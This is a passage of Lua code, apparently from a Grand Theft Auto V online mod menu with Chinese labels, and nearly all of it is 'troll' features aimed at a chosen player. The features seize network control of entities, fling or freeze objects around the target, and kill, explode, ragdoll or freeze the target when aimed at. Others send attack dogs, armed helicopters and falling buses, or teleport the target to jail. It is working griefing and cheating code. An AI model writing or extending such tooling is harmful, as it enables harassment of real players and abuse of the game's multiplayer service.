                if ent_func.get_entity_control_onces(vehicle_handle) then
                    ENTITY.APPLY_FORCE_TO_ENTITY(vehicle_handle, 3, rel.x, rel.y, rel.z, 0.0, 0.0, 1.0, 0, false, false, true, false, false)
                end
            end
        end
    end
    local peds = entities.get_all_peds_as_pointers()
	for peds as ped do
        local ped_handle = entities.pointer_to_handle(ped)
        if ped_handle != player_ped then
            local ped_pos = ENTITY.GET_ENTITY_COORDS(ped_handle, false)
		    if ent_func.get_distance_between(player_ped, ped_pos) <= player_aura_radius then
                local rel = v3.new(ped_pos)
                --subtract your pos from rel--
                rel:sub(players.get_position(pid))
                --scales the v3 to have a length of 1--
                rel:normalise()
                if ent_func.get_entity_control_onces(ped_handle) then
                    PED.SET_PED_TO_RAGDOLL(ped_handle, 2500, 0, 0, false, false, false)
		    	    ENTITY.APPLY_FORCE_TO_ENTITY(ped_handle, 3, rel.x, rel.y, rel.z, 0.0, 0.0, 1.0, 0, false, false, true, false, false)
                end
		    end
        end
	end
end)
GTLP(aura_list_player,("吸附光环"), {}, "", function()
    local vehicles = entities.get_all_vehicles_as_pointers()
    local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local player_vehicle = ent_func.get_vehicle_from_ped(player_ped)
    for vehicles as vehicle do
        local vehicle_handle = entities.pointer_to_handle(vehicle)
        if vehicle_handle != player_vehicle then
            local vehicle_pos = ENTITY.GET_ENTITY_COORDS(vehicle_handle)
            if ent_func.get_distance_between(player_ped, vehicle_pos) <= player_aura_radius then
                local rel = v3.new(vehicle_pos)
                --subtract your pos from rel--
                rel:sub(players.get_position(pid))
                --scales the v3 to have a length of 1--
                rel:normalise()
                if ent_func.get_entity_control_onces(vehicle_handle) then
                    ENTITY.APPLY_FORCE_TO_ENTITY(vehicle_handle, 3, -rel.x, -rel.y, -rel.z, 0.0, 0.0, 1.0, 0, false, false, true, false, false)
                end
            end
        end
    end
    local peds = entities.get_all_peds_as_pointers()
	for peds as ped do
        local ped_handle = entities.pointer_to_handle(ped)
        if ped_handle != player_ped then
            local ped_pos = ENTITY.GET_ENTITY_COORDS(ped_handle, false)
		    if ent_func.get_distance_between(player_ped, ped_pos) <= player_aura_radius then
                local rel = v3.new(ped_pos)
                --subtract your pos from rel--
                rel:sub(players.get_position(pid))
                --scales the v3 to have a length of 1--
                rel:normalise()
                if ent_func.get_entity_control_onces(ped_handle) then
                    PED.SET_PED_TO_RAGDOLL(ped_handle, 2500, 0, 0, false, false, false)
		    	    ENTITY.APPLY_FORCE_TO_ENTITY(ped_handle, 3, -rel.x, -rel.y, -rel.z, 0.0, 0.0, 1.0, 0, false, false, true, false, false)
                end
		    end
        end
	end
end)
GTLP(aura_list_player,("冻结光环"), {}, "", function()
    local vehicles = entities.get_all_vehicles_as_pointers()
    local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local player_vehicle = ent_func.get_vehicle_from_ped(player_ped)
    for vehicles as vehicle do
        local vehicle_handle = entities.pointer_to_handle(vehicle)
        if vehicle_handle != player_vehicle then
            local vehicle_pos = ENTITY.GET_ENTITY_COORDS(vehicle_handle)
            if ent_func.get_distance_between(player_ped, vehicle_pos) <= player_aura_radius then
                if ent_func.get_entity_control_onces(vehicle_handle) then
                    ENTITY.FREEZE_ENTITY_POSITION(vehicle_handle, true)
                end
            else
                ENTITY.FREEZE_ENTITY_POSITION(vehicle_handle, false)
            end
        end
    end
    local peds = entities.get_all_peds_as_pointers()
	for peds as ped do
        local ped_handle = entities.pointer_to_handle(ped)
        if ped_handle != player_ped then
            local ped_pos = ENTITY.GET_ENTITY_COORDS(ped_handle, false)
		    if ent_func.get_distance_between(player_ped, ped_pos) <= player_aura_radius then
                if not PED.IS_PED_IN_ANY_VEHICLE(ped_handle, false) then
                    TASK.CLEAR_PED_TASKS_IMMEDIATELY(ped_handle)
                end
                if ent_func.get_entity_control_onces(ped_handle) then
                    ENTITY.FREEZE_ENTITY_POSITION(ped_handle, true)
                end
            else
                ENTITY.FREEZE_ENTITY_POSITION(ped_handle, false)
            end
        end
	end
end)
GTLP(aura_list_player,("弹射光环"), {}, "", function()
    local vehicles = entities.get_all_vehicles_as_pointers()
    local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local player_vehicle = ent_func.get_vehicle_from_ped(player_ped)
    for vehicles as vehicle do
        local vehicle_handle = entities.pointer_to_handle(vehicle)
        if vehicle_handle != player_vehicle then
            local vehicle_pos = ENTITY.GET_ENTITY_COORDS(vehicle_handle)
            if ent_func.get_distance_between(player_ped, vehicle_pos) <= player_aura_radius then
                local rel = v3.new(vehicle_pos)
                --subtract your pos from rel--
                rel:sub(players.get_position(players.user()))
                --turn rel into a rot--
                local rot = rel:toRot()
                if ent_func.get_entity_control_onces(vehicle_handle) then
                    ENTITY.SET_ENTITY_ROTATION(vehicle_handle, rot.x, rot.y, rot.z, 2, false)
                    VEHICLE.SET_VEHICLE_FORWARD_SPEED(vehicle_handle, 100)
                end
            end
        end
    end
    local peds = entities.get_all_peds_as_pointers()
	for peds as ped do
        local ped_handle = entities.pointer_to_handle(ped)
        if ped_handle != player_ped then
            local ped_pos = ENTITY.GET_ENTITY_COORDS(ped_handle, false)
		    if ent_func.get_distance_between(player_ped, ped_pos) <= player_aura_radius then
                local rel = v3.new(ped_pos)
                --subtract your pos from rel--
                rel:sub(players.get_position(players.user()))
                --multiply rel with 100--
                rel:mul(100)
                if ent_func.get_entity_control_onces(ped_handle) then
                    PED.SET_PED_TO_RAGDOLL(ped_handle, 2500, 0, 0, false, false, false)
		    	    ENTITY.APPLY_FORCE_TO_ENTITY(ped_handle, 3, rel.x, rel.y, rel.z, 0, 0, 1.0, 0, false, false, true, false, false)
                end
            end
        end
	end
end)
aim_reactions_list = GT(updatetroll, "定向瞄准反应")
GTLP(aim_reactions_list, "被瞄准时撞击玩家", {}, "", function ()
    local c1 = players.get_position(pid)
    local c2 =  players.get_position(players.user())
    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    if PED.IS_PED_FACING_PED(ped, players.user_ped(), 2) and ENTITY.HAS_ENTITY_CLEAR_LOS_TO_ENTITY(ped, players.user_ped(), 17) and MISC.GET_DISTANCE_BETWEEN_COORDS(c1.x, c1.y, c1.z, c2.x, c2.y, c2.z) < 1000  and WEAPON.GET_SELECTED_PED_WEAPON(ped) != -1569615261  and PED.GET_PED_CONFIG_FLAG(ped, 78, true) then 
        gtoast(players.get_name(pid) .. " 正在瞄准你")
        local player_pos = players.get_position(pid)
        local closest_vehicle = ent_func.getClosestVehicle(player_pos)
        local vehicle_pos = ENTITY.GET_ENTITY_COORDS(closest_vehicle)
        local pos2 = players.get_position(pid)
        local rel = v3.new(pos2)
        rel:sub(vehicle_pos)
        local rot = rel:toRot()
        if ent_func.get_entity_control_onces(closest_vehicle) then
            ENTITY.SET_ENTITY_ROTATION(closest_vehicle, rot.x, rot.y, rot.z, 2, false)
            VEHICLE.SET_VEHICLE_FORWARD_SPEED(closest_vehicle, 100)
        end
    end
end)
GTLP(aim_reactions_list, "被瞄准时爆炸玩家", {}, "", function ()
    local c1 = players.get_position(pid)
    local c2 =  players.get_position(players.user())
    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    if PED.IS_PED_FACING_PED(ped, players.user_ped(), 2) and ENTITY.HAS_ENTITY_CLEAR_LOS_TO_ENTITY(ped, players.user_ped(), 17) and MISC.GET_DISTANCE_BETWEEN_COORDS(c1.x, c1.y, c1.z, c2.x, c2.y, c2.z) < 1000  and WEAPON.GET_SELECTED_PED_WEAPON(ped) != -1569615261  and PED.GET_PED_CONFIG_FLAG(ped, 78, true) then 
        gtoast(players.get_name(pid) .. " 正在瞄准你")
        local player_pos = players.get_position(pid)
        FIRE.ADD_EXPLOSION(player_pos.x, player_pos.y, player_pos.z, 1, 1, false, true, 0.0, false)
    end
end)
GTLP(aim_reactions_list, "被瞄准时击杀玩家", {}, "", function ()
    local c1 = players.get_position(pid)
    local c2 =  players.get_position(players.user())
    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    if PED.IS_PED_FACING_PED(ped, players.user_ped(), 2) and ENTITY.HAS_ENTITY_CLEAR_LOS_TO_ENTITY(ped, players.user_ped(), 17) and MISC.GET_DISTANCE_BETWEEN_COORDS(c1.x, c1.y, c1.z, c2.x, c2.y, c2.z) < 1000  and WEAPON.GET_SELECTED_PED_WEAPON(ped) != -1569615261  and PED.GET_PED_CONFIG_FLAG(ped, 78, true) then 
        gtoast(players.get_name(pid) .. " 正在瞄准你")
        local player_pos = players.get_position(pid)
        menu.trigger_commands("kill" .. players.get_name(pid))
    end
end)
GTLP(aim_reactions_list, "被瞄准时冻结玩家", {}, "", function ()
    local c1 = players.get_position(pid)
    local c2 =  players.get_position(players.user())
    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    if PED.IS_PED_FACING_PED(ped, players.user_ped(), 2) and ENTITY.HAS_ENTITY_CLEAR_LOS_TO_ENTITY(ped, players.user_ped(), 17) and MISC.GET_DISTANCE_BETWEEN_COORDS(c1.x, c1.y, c1.z, c2.x, c2.y, c2.z) < 1000  and WEAPON.GET_SELECTED_PED_WEAPON(ped) != -1569615261  and PED.GET_PED_CONFIG_FLAG(ped, 78, true) then 
        gtoast(players.get_name(pid) .. " 正在瞄准你")
        local player_pos = players.get_position(pid)
        menu.trigger_commands("freeze" .. players.get_name(pid) .. " on") 
    else
        menu.trigger_commands("freeze" .. players.get_name(pid) .. " off")
    end
end)
GTLP(aim_reactions_list, "被瞄准时摔倒玩家", {}, "", function ()
    local c1 = players.get_position(pid)
    local c2 =  players.get_position(players.user())
    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    if PED.IS_PED_FACING_PED(ped, players.user_ped(), 2) and ENTITY.HAS_ENTITY_CLEAR_LOS_TO_ENTITY(ped, players.user_ped(), 17) and MISC.GET_DISTANCE_BETWEEN_COORDS(c1.x, c1.y, c1.z, c2.x, c2.y, c2.z) < 1000  and WEAPON.GET_SELECTED_PED_WEAPON(ped) != -1569615261  and PED.GET_PED_CONFIG_FLAG(ped, 78, true) then 
        gtoast(players.get_name(pid) .. " 正在瞄准你")
        local player_pos = players.get_position(pid)
        menu.trigger_commands("ragdoll" .. players.get_name(pid) .. " on")
    else
        menu.trigger_commands("ragdoll" .. players.get_name(pid) .. " off")
    end
end)
    GTTG(updatetroll, "报警抓住他", {}, "", function (on)
    if on then
        local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(0,pid)
        local player_pos = players.get_position(pid)
        local police_ped_hash = util.joaat("s_m_y_cop_01")
        local police_car_hash = util.joaat("police3")
        ent_func.request_model(police_ped_hash)
        ent_func.request_model(police_car_hash)
        police_car = entities.create_vehicle(police_car_hash, v3.new(player_pos.x+math.random(-10, 10), player_pos.y+math.random(-10, 10), player_pos.z), 0)
        local police_car_coords = ENTITY.GET_ENTITY_COORDS(police_car, true)
        local rel = v3.new(player_pos)
        rel:sub(police_car_coords)
        local rot = rel:toRot()
        ENTITY.SET_ENTITY_ROTATION(police_car, rot.x, rot.y, rot.z, 2, false)
        police_ped = entities.create_ped(1, police_ped_hash, police_car_coords, 0)
        PED.SET_PED_INTO_VEHICLE(police_ped, police_car, -1)
        VEHICLE.SET_VEHICLE_SIREN(police_car, true)
        VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_ALL_PLAYERS(police_car, true)
        VEHICLE.MODIFY_VEHICLE_TOP_SPEED(police_car, 20000)
        ENTITY.SET_ENTITY_LOAD_COLLISION_FLAG(police_car, 0, 0)
        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(police_car, true, true)
        ENTITY.SET_ENTITY_LOAD_COLLISION_FLAG(police_ped, 0, 0)
        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(police_ped, true, true)
        TASK.TASK_VEHICLE_MISSION_PED_TARGET(police_ped, police_car, target_ped, 6, 100.0, 0, 0.0, 0.0, true)
        while on do
            if ent_func.get_distance_between(police_car, player_pos) >= 50 then
                player_pos = players.get_position(pid)
                ENTITY.SET_ENTITY_COORDS(police_car, player_pos.x+math.random(-10, 10), player_pos.y+math.random(-10, 10), player_pos.z, false, false, false, false)
                police_car_coords = ENTITY.GET_ENTITY_COORDS(police_car, true)
                local rel = v3.new(player_pos)
                rel:sub(police_car_coords)
                local rot = rel:toRot()
                ENTITY.SET_ENTITY_ROTATION(police_car, rot.x, rot.y, rot.z, 2, false)
            end
            util.yield(500)
        end
    end
    if not on then
        entities.delete_by_handle(police_car)
        entities.delete_by_handle(police_ped)
    end
end)
    GTAC(updatetroll, "截取货物", {}, "顾名思义,坏蛋功能\n让该玩家拉货时启用截货机制\n并且将在五秒后杀死该玩家:)", function ()
    takerestore(pid)
    end)
    GTAC(updatetroll, "送他回家并在家中暴毙", {}, "", function ()
        takehome(pid)
    end)
    GTAC(updatetroll, "鲨鱼袭击", {''}, "鲨鱼!!!\n生成鲨鱼吃掉该玩家", function()
        local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid))
        local pedp = players.user_ped(pid)
        local NPC = Cped(26, 113504370, pos, 0)
        ENTITY.FREEZE_ENTITY_POSITION(NPC, true)
        ENTITY.SET_ENTITY_ROTATION(NPC, 90, 0, 0, 0)
        menu.trigger_commands("kill" .. players.get_name(pid))
        FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z, 4, 0, false, false, 1.0, pedp)
        FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z, 13, 0, true, false, 0, pedp)
    end)
    local glitchforcefield
    glitchforcefield = GTLP(updatetroll, "让TA变成孤儿", {""}, "移除他周围所有东西\n如果该玩家在载具内\n那就变成了抽搐恶搞", function()
        local glitch_hash = util.joaat("p_spinning_anus_s")
        RequestModel(glitch_hash)
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = players.get_position(pid)
        if not ENTITY.DOES_ENTITY_EXIST(ped) then
        gtoast(players.get_name(pid) .. " 距离太远")
        glitchforcefield.value = false
        util.stop_thread() end
        local obj = entities.create_object(glitch_hash, pos)
        ENTITY.SET_ENTITY_VISIBLE(obj, false)
        ENTITY.SET_ENTITY_COLLISION(obj, true, true)
        wait()
        entities.delete_by_handle(obj) 
    end)
    local req_count = 0
    GTLP(updatetroll, "TA的车变成飘柔", {""}, "360旋转该玩家的载具", function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local spv = PED.GET_VEHICLE_PED_IS_USING(ped)
        local height = ENTITY.GET_ENTITY_HEIGHT_ABOVE_GROUND(spv)
        if not PED.IS_PED_IN_ANY_VEHICLE(ped, false) then
            gtoast("不在车里")
        return end
        if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(spv) then
            repeat
                if req_count >= 250 then
                    gtoast("距离太远了")
                return end
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(spv)
                util.yield()
                req_count += 1
            until NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(spv)
        end
        if height < 5.0 and height > 0.1 then
            VEHICLE.SET_VEHICLE_ON_GROUND_PROPERLY(spv, 2)
        end
        if spv ~= 0 and not PED.IS_PED_DEAD_OR_DYING(ped) then
            ENTITY.APPLY_FORCE_TO_ENTITY(spv, 5, 0.0, 0.0, 150.0, 0, 0, 0, 0, true, false, true, false, true)
        end
    end)
    GTAC(updatetroll, "送他去看云", {""}, "", function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local mdl = util.joaat("boxville3")
        local pos = players.get_position(pid)
        RequestModel(mdl)
        if PED.IS_PED_IN_ANY_VEHICLE(ped, false) then
            gtoast(players.get_name(pid) .. " 在载具内")
        return end
        if TASK.IS_PED_WALKING(ped) then
            boxville = entities.create_vehicle(mdl, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(ped, 0.0, 2.0, 0.0), ENTITY.GET_ENTITY_HEADING(ped))
            ENTITY.SET_ENTITY_VISIBLE(boxville, false)
            util.yield(250)
            repeat
                if v3.distance(players.get_position(pid), ENTITY.GET_ENTITY_COORDS(boxville)) < 10.0 then
                    if boxville ~= 0 and ENTITY.DOES_ENTITY_EXIST(boxville)then
                        ENTITY.APPLY_FORCE_TO_ENTITY(boxville, 1, 0.0, 0.0, 25.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
                    end
                    util.yield()
                else
                    entities.delete_by_handle(boxville)
                end
                util.yield()
                pos = players.get_position(pid)
            until pos.z > 2600.0
            util.yield(100)
            if boxville ~= 0 and ENTITY.DOES_ENTITY_EXIST(boxville) then 
                entities.delete_by_handle(boxville)
            end
        else
            gtoast(players.get_name(pid) .. "未在陆地行走")
        end
    end)
    get_control_of_entity = function(h, t)
    if not h then
        return
    end
    if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(h) then
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(h)
        local time = util.current_time_millis() + t
        while ENTITY.IS_AN_ENTITY(h) and not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(h) and time > util.current_time_millis() do
        wait(5)
        end
    end
    return NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(h)
    end
    GTAC(updatetroll, "巴士轰炸", {''}, "", function()
        for i = 0, 30 do
            spawn_vehicle(3581397346, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid)), 0)
        end
        wait(10)
        allvehs = entities.get_all_vehicles_as_handles()
        for i = 1, #allvehs do
            ppos = ENTITY.GET_ENTITY_COORDS(players.user_ped(pid))
            get_control_of_entity(allvehs[i], 300)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(allvehs[i], ppos.x, ppos.y, ppos.z, true, true, true)
        end
        wait(500)
    end)
    GTAC(updatetroll, "放狗咬他", {''}, "", function(a)
        request_model(1318032802)
        local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid))
        pos.y = pos.y + 2
        pc2ped = entities.create_ped(28, 1318032802, pos, 0, true, false)
        PED.SET_CAN_ATTACK_FRIENDLY(pc2ped, true)
        PED.SET_PED_COMBAT_ATTRIBUTES(pc2ped, 46, true)
        PED.SET_PED_COMBAT_ATTRIBUTES(pc2ped, 52, true)
        PED.SET_PED_COMBAT_ATTRIBUTES(pc2ped, 1, true)
        PED.SET_PED_COMBAT_ATTRIBUTES(pc2ped, 2, true)
        ENTITY.SET_ENTITY_INVINCIBLE(pc2ped, true)
        PED.SET_PED_COMBAT_RANGE(pc2ped, 1000)
        local wjped = players.user_ped(pid)
        TASK.TASK_COMBAT_PED(pc2ped, wjped, 0, 16)
    end)
    GTAC(updatetroll, "关门放狗", {''}, "", function(a)
        request_model(779277682)
        local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid))
        pos.z = pos.z + 0.95
        local pos1 = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid))
        pos1.z = pos1.z - 0.9
        local cage = util.joaat("prop_feeder1_cr")
        STREAMING.REQUEST_MODEL(cage)
        OBJECT.CREATE_OBJECT_NO_OFFSET(cage, pos.x, pos.y, pos.z, true, true, true)
        OBJECT.CREATE_OBJECT_NO_OFFSET(cage, pos1.x, pos1.y, pos1.z, true, true, true)
        local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid))
        pos.z = pos.z + 2
        pcped = entities.create_ped(28, 1318032802, pos, 0, true, false)
        PED.SET_CAN_ATTACK_FRIENDLY(pcped, true)
        PED.SET_PED_COMBAT_ATTRIBUTES(pcped, 46, true)
        PED.SET_PED_COMBAT_ATTRIBUTES(pcped, 52, true)
        PED.SET_PED_COMBAT_ATTRIBUTES(pcped, 1, true)
        PED.SET_PED_COMBAT_ATTRIBUTES(pcped, 2, true)
        ENTITY.SET_ENTITY_INVINCIBLE(pcped, true)
        PED.SET_PED_COMBAT_RANGE(pcped, 1000)
        local wjped = players.user_ped(pid)
        TASK.TASK_COMBAT_PED(pcped, wjped, 0, 16)
    end)
    GTAC(updatetroll, "让他致幻", {''}, "", function(a)
        boomfly(a)
    end)
    GTAC(updatetroll, "直升机砸死他", {""}, "", function(on_click)
        local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local vehicleHash = util.joaat("buzzard2")
		local pedHash = 1558115333
		request_model(vehicleHash, pedHash)
		local coords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
        local spawn_pos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(player_ped, math.random(0, 0),  math.random(0, 0), 10)
        local vehicle = entities.create_vehicle(vehicleHash, spawn_pos, ENTITY.GET_ENTITY_HEADING(player_ped))
        for i=-1, VEHICLE.GET_VEHICLE_MAX_NUMBER_OF_PASSENGERS(vehicle) - 1 do
            local clown = entities.create_ped(2, pedHash, spawn_pos, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
            PED.SET_PED_INTO_VEHICLE(clown, vehicle, i)
            if i % 2 == 0 then
                WEAPON.GIVE_WEAPON_TO_PED(clown, -1312131151, 1000, false, true)
            else
                WEAPON.GIVE_WEAPON_TO_PED(clown, -1312131151, 1000, false, true)
            end
			PED.SET_PED_AS_COP(clown, true)
			VEHICLE.SET_HELI_BLADES_FULL_SPEED(vehicle)
			addBlipForEntity(vehicle, 422, 40)
			PED.SET_PED_CONFIG_FLAG(clown, 281, true)
			PED.SET_PED_CONFIG_FLAG(clown, 2, true)
			PED.SET_PED_CONFIG_FLAG(clown, 33, false)
            PED.SET_PED_COMBAT_ATTRIBUTES(clown, 5, true)
            PED.SET_PED_COMBAT_ATTRIBUTES(clown, 46, true)
			PED.SET_PED_ACCURACY(clown, 100.0)
			PED.SET_PED_HEARING_RANGE(clown, 99999)
			PED.SET_PED_RANDOM_COMPONENT_VARIATION(clown, 0)
			VEHICLE.SET_VEHICLE_DOORS_LOCKED(vehicle, 3)
			VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(vehicle, "FIB")
			VEHICLE.SET_VEHICLE_EXPLODES_ON_HIGH_EXPLOSION_DAMAGE(vehicle, false)
			VEHICLE.MODIFY_VEHICLE_TOP_SPEED(vehicle, 50)
			PED.SET_PED_MAX_HEALTH(clown, 150)
			--ENTITY.SET_ENTITY_PROOFS(ped, false, true, false, false, 0, false, false, false)
			--ENTITY.SET_ENTITY_HEALTH(clown, 150)
			PED.SET_PED_ARMOUR(clown, 100)
			PED.SET_PED_SHOOT_RATE(clown, 5)
			--VEHICLE.SET_VEHICLE_MOD_KIT(vehicle, 0)
			VEHICLE.SET_VEHICLE_CUSTOM_PRIMARY_COLOUR(vehicle, 255, 0, 255)
			VEHICLE.SET_VEHICLE_CUSTOM_SECONDARY_COLOUR(vehicle, 255, 0, 255)
			VEHICLE.SET_VEHICLE_MOD_COLOR_1(vehicle, 3, 0, 0) 
			VEHICLE.SET_VEHICLE_MOD_COLOR_2(vehicle, 3, 0, 0)
			VEHICLE.SET_VEHICLE_WHEEL_TYPE(vehicle, 11) 
			PED.SET_PED_SUFFERS_CRITICAL_HITS(clown, false)
			VEHICLE.SET_VEHICLE_MOD(vehicle, 0, 3) 
			VEHICLE.SET_VEHICLE_EXTRA_COLOURS(vehicle, 255, 255)
			VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT_INDEX(vehicle, 4) 
			VEHICLE.SET_VEHICLE_MOD(vehicle, 16, 4) 
			VEHICLE.SET_VEHICLE_ENGINE_HEALTH(vehicle, 2000)
			VEHICLE.SET_VEHICLE_EXPLODES_ON_HIGH_EXPLOSION_DAMAGE(vehicle, false)
			VEHICLE.SET_VEHICLE_MOD(vehicle, 16, 4) 
			VEHICLE.SET_VEHICLE_PETROL_TANK_HEALTH(vehicle, 2000)
			VEHICLE.SET_VEHICLE_TYRES_CAN_BURST(vehicle, false)
			if godmodeatk then
				ENTITY.SET_ENTITY_INVINCIBLE(vehicle, true)
			end
			if pcar then 
				PED.SET_PED_COMBAT_ATTRIBUTES(clown, 3, false)
			end
			if d then
				PED.SET_AI_WEAPON_DAMAGE_MODIFIER(clown, 3000000)
			end
            if i == -1 then
                TASK.TASK_VEHICLE_CHASE(clown, player_ped)
				WEAPON.GIVE_WEAPON_TO_PED(clown, -1312131151 , 1000, false, true)
            else
                TASK.TASK_COMBAT_PED(clown, player_ped, 0, 16)
				WEAPON.GIVE_WEAPON_TO_PED(clown, -1312131151, 1000, false, true)
            end
        end
    end)
        GTAC(updatetroll, "送到监狱", {}, "", function()
        local my_pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
        local my_ped = PLAYER.GET_PLAYER_PED(players.user())
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(my_ped, 1628.5234, 2570.5613, 45.56485, true, false, false, false)
        menu.trigger_commands("givesh " .. players.get_name(pid))
        menu.trigger_commands("summon " .. players.get_name(pid))
        menu.trigger_commands("invisibility on")
        menu.trigger_commands("otr")
        wait(5000)
        menu.trigger_commands("invisibility off")
        menu.trigger_commands("otr")
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(my_ped, my_pos.x, my_pos.y, my_pos.z)
    end)
    GTAC(updatetroll, "诛仙剑阵", {''}, "", function()
        pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid))
        pos.z = pos.z + 30
        car = CreateVehicle(3581397346, pos, 0)
        ENTITY.SET_ENTITY_ROTATION(car, -90, 0, 0, 0, true)
        VEHICLE.SET_VEHICLE_FORWARD_SPEED(car, 1000)
        wait(1)
        for i = 0, 5 do
            pos.z = pos.z + 30
            pos.x = pos.x + math.random(-6, 6)
            pos.y = pos.y + math.random(-6, 6)
            car = CreateVehicle(3581397346, pos, 0)
            ENTITY.SET_ENTITY_ROTATION(car, -90, 0, 0, 0, true)
            VEHICLE.SET_VEHICLE_FORWARD_SPEED(car, 1000)
        end
    end)
    function Cped(type, hash, coords, dir)
        request_model(hash, 300)
        local ped = entities.create_ped(type, hash, coords, dir, true, false)
        STREAMING.REQUEST_MODEL(hash)
        return ped
    end
    GTAC(updatetroll, "黑人抬棺", {''}, "", function()
        get_control_of_entity = function(h, t)
            if not h then
                return
            end
            if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(h) then
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(h)
                local time = util.current_time_millis() + t
                while ENTITY.IS_AN_ENTITY(h) and not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(h) and time >
                    util.current_time_millis() do
                    wait(5)
                end
            end
            return NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(h)
        end
        pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid))
        pedp = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        pos.z = pos.z + 0.6
        coffin = OBJECT.CREATE_OBJECT_NO_OFFSET(2193278353, 0, 0, 0, pos, false)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(coffin, pedp, 0, 0, 0, -1, 0.8, 0.0, 0, 0.0, true, true, false, 0, true)
        npc1 = Cped(26, 2602752943, pos, 0)
        get_control_of_entity(npc1, 300)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(npc1, coffin, 0, 0, 0.55, 0, -0.6, 0.0, 0, 0.0, true, true, false, 0, true)
        ENTITY.FREEZE_ENTITY_POSITION(npc1, true)
        get_control_of_entity(npc2, 300)
        npc2 = Cped(26, 2602752943, pos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(npc2, coffin, 0, 0, -0.55, 0, -0.6, 0.0, 0, 0.0, true, true, false, 0, true)
        ENTITY.FREEZE_ENTITY_POSITION(npc2, true)
        get_control_of_entity(npc3, 300)
        npc3 = Cped(26, 2602752943, pos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(npc3, coffin, 0, 0, 0.55, 0, -0.6, 0.0, 0, 0.0, true, true, false, 0, true)
        ENTITY.FREEZE_ENTITY_POSITION(npc3, true)
        get_control_of_entity(npc4, 300)
        npc4 = Cped(26, 2602752943, pos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(npc4, coffin, 0, 0, -0.55, 0.5, -0.6, 0.0, 0, 0.0, true, true, false, 0, true)
        ENTITY.FREEZE_ENTITY_POSITION(npc4, true)
        get_control_of_entity(npc5, 300)
        npc5 = Cped(26, 2602752943, pos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(npc5, coffin, 0, 0, 0.55, -0.5, -0.6, 0.0, 0, 0.0, true, true, false, 0, true)
        ENTITY.FREEZE_ENTITY_POSITION(npc5, true)
        get_control_of_entity(npc6, 300)
        npc6 = Cped(26, 2602752943, pos, 0)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(npc6, coffin, 0, 0, -0.55, -0.5, -0.6, 0.0, 0, 0.0, true, true, false, 0, true)
        ENTITY.FREEZE_ENTITY_POSITION(npc6, true)
    end)
    GTAC(updatetroll, "克隆抬棺", {''}, "", function()
        get_control_of_entity = function(h, t)
            if not h then
                return
            end
            if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(h) then
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(h)
                local time = util.current_time_millis() + t
                while ENTITY.IS_AN_ENTITY(h) and not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(h) and time >
                    util.current_time_millis() do
                    wait(5)
                end
            end
            return NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(h)
        end
        pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid))
